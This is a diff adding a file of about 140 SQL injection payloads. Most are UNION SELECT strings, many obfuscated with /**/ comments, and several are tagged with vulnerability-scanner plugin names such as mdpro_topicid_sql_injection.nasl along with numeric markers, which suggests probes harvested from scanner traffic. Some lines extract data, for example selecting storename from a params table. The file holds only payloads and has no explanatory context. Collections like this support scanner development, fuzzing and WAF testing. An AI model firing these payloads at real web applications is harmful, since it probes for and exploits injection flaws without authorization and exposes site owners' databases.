@@ -1,0 +1,140 @@
+200607' union select 1,501184215,1,1,1,1,1,1,1,1--
+'union/**/select/**/0,0,1369222205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+9999/**/union/**/select/**/1331905182,1,1,1,1,1,1,1--
+-99 union select 2020390524,2,880987929,4,5,6,7,8,9,0,1,2,3 --
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --
+pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- 
+'union/**/select/**/0,0,1647791366,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
+200607' union select 1,1192121872,1,1,1,1,1,1,1,1--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--
+'union/**/select/**/0,0,521532225,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
+200607' union select 1,1128524552,1,1,1,1,1,1,1,1--
+200607' union select 1,1100287420,1,1,1,1,1,1,1,1--
+1 union select 1,1331919202
+1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+-1' union select 0,157871866,0,0,0,0,0--
+' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+-1' union select 0,1323875856,0,0,0,0,0--
+'union/**/select/**/0,0,1364632458,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
+-1/**/union/**/select/**/0,1,403538393,1441170175,1,1,1,1,1--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908835',null,null,null,null --
+200607' union select 1,1849014202,1,1,1,1,1,1,1,1--
+9999/**/union/**/select/**/1331909370,1,1,1,1,1,1,1--
+pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
+1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+200607' union select 1,1759684664,1,1,1,1,1,1,1,1--
+-1' union select 0,1013365063,0,0,0,0,0--
+'/**/union/**/select/**/1,2,1331909424,4--
+200607' union select 1,674790948,1,1,1,1,1,1,1,1--
+-1' union select 0,348320449,0,0,0,0,0--
+'union/**/select/**/0,0,763560836,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
+'/**/union/**/select/**/1,2,1331909424,4--
+1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
+9999/**/union/**/select/**/1332008332,1,1,1,1,1,1,1--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
+-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,512612977),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+-1' union select 0,929714876,0,0,0,0,0--
+200607' union select 1,1425852379,1,1,1,1,1,1,1,1--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010395',null,null,null,null --
+pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
+' union select 1,1,'1331904667','calendarix_month_sql_injection.nasl',1 
+'union select '1','2','pixelpost_category_sql_injection.nasl','1332008334','5'--
+pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331919009','5'--
+pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
+' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+' union select 1,1,'1331904225','calendarix_month_sql_injection.nasl',1 
+'union/**/select/**/0,0,1431582502,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-1 union select 1,1332009307,1854936082 --
+-1/**/union/**/select/**/1332009308,1,1510172050--
+'/**/union/**/select/**/1,2,1331923205,4--
+-1' union select 0,1385926503,0,0,0,0,0--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332008329',null,null,null,null --
+-1 union select 0,1,2,169866100570,4,5,6,7,8,9,10,11--
+-1' union select 0,576895199,0,0,0,0,0--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
+pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
+-1' union select 0,473248912,0,0,0,0,0--
+' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+-1/**/union/**/select 2080375299--
+200607' union select 1,379183911,1,1,1,1,1,1,1,1--
+' union select 1,1,'1331904431','calendarix_month_sql_injection.nasl',1 
+200607' union select 1,779875714,1,1,1,1,1,1,1,1--
+200607' union select 1,744292830,1,1,1,1,1,1,1,1--
+pligg_url_sql_injection.nasl' union select 1331908877,462918967 -- 
+' union select 1,1,'1332010410','calendarix_month_sql_injection.nasl',1 
+'/**/union/**/select/**/1,2,1332008335,4--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010410',null,null,null,null --
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331923204','5'--
+1 union select 1,1332008331
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
+-1 union select 0,1,2,601832871808,4,5,6,7,8,9,10,11--
+'/**/union/**/select/**/1,2,1332008335,4--
+-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,1131566153),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+-99 union select 362784712,2,1572590489,4,5,6,7,8,9,0,1,2,3 --
+9999/**/union/**/select/**/1332009306,1,1,1,1,1,1,1--
+-1/**/union/**/select 873011444--
+-1' union select 0,1005695442,0,0,0,0,0--
+-1' union select 0,453988391,0,0,0,0,0--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908834',null,null,null,null --
+-1' union select 0,86738267,0,0,0,0,0--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
+-1' union select 0,2033566095,0,0,0,0,0--
+'union/**/select/**/0,0,661699354,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-1' union select 0,255056503,0,0,0,0,0--
+' union select 1,1,'1332008331','calendarix_month_sql_injection.nasl',1 
+-1' union select 0,1253662444,0,0,0,0,0--
+200607' union select 1,1782293471,1,1,1,1,1,1,1,1--
+'/**/union/**/select/**/1,2,1331904464,4--
+-99 union select 435389080,2,2084643622,4,5,6,7,8,9,0,1,2,3 --
+200607' union select 1,678642094,1,1,1,1,1,1,1,1--
+-99 union select 854943738,2,566710091,4,5,6,7,8,9,0,1,2,3 --
+-1' union select 0,1704795451,0,0,0,0,0--
+200607' union select 1,1284682657,1,1,1,1,1,1,1,1--
+-99999/**/union/**/select/**/0,1,concat(1332008331,0x3a,892071098),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
+-1/**/union/**/select 327415864--
+' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
+'/**/union/**/select/**/1,2,1331904463,4--
+xx' union/**/  select '1','412596083481','2','comments' /*
+'union/**/select/**/0,0,1244365684,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+'/**/union/**/select/**/1,2,1331905235,4--
+pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
+-9 union select null,null,null,1331904243,4,5
+-1 union select null,123456,null,null,null,null--
+pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
+-1 union select 1,1332010400,529560500 --
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331905220','5'--
+'union/**/select/**/0,0,20217353,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
+-1 union select 0,1,2,947023198940,4,5,6,7,8,9,10,11--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331919010','5'--
+200607' union select 1,804459550,1,1,1,1,1,1,1,1--
+200607' union select 1,450076443,1,1,1,1,1,1,1,1--
+'union/**/select/**/0,0,300412621,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-9 union select null,null,null,1331905234,4,5
+' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
+'union select '1','2','pixelpost_category_sql_injection.nasl','1331908880','5'--
+'union select '1','2','pixelpost_category_sql_injection.nasl','1332010414','5'--
+'/**/union/**/select/**/1,2,1331904464,4--
+1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+-1/**/union/**/select/**/0,1,1480204165,1632363387,1,1,1,1,1--
+-1 union select 1,1331909396,602648682 --
+pligg_url_sql_injection.nasl' union select 1331904238,927121236 -- 
+-99999/**/union/**/select/**/0,1,concat(1331905166,0x3a,1536152654),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+'union/**/select/**/0,0,869732329,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+-99 union select 1461801666,2,718923871,4,5,6,7,8,9,0,1,2,3 --
+'/**/union/**/select/**/1,2,1331923205,4--
+-99999/**/union/**/select/**/0,1,concat(1332008331,0x3a,892071098),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+9999/**/union/**/select/**/1331904231,1,1,1,1,1,1,1--
+-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904216',null,null,null,null --
